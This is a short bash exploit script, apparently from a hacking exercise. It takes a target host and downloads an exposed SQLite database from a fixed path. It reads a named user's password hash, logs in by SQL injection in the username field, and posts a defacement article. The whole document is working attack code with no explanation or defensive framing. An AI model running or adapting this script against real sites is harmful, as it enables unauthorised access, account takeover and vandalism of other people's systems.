#!/bin/bash -eu
BASE=$1

USER=erinn.atwater

echo "Downloading database file..."
curl "http://${BASE}/files123/data.db" -o data.db 2>/dev/null
echo -n "Getting password hash for user '${USER}'... "
HASH=$(sqlite3 data.db "select password from users where username='${USER}'")
echo "found hash ${HASH}."

rm -f data.db

echo "Logging in as user '${USER}'..."
curl -c cookies.txt "http://${BASE}/post.php" -d "form=login" -d "username=' OR password='${HASH}';--"
echo "Posting new article..."
curl -b cookies.txt "http://${BASE}/post.php" -d "form=content" -d "type=1" -d "title=haxxored_again" -d "content=ALLYOURBASEAREBELONGTOERINN"
echo -e "\033[32mDone!\033[0m"

rm -f cookies.txt
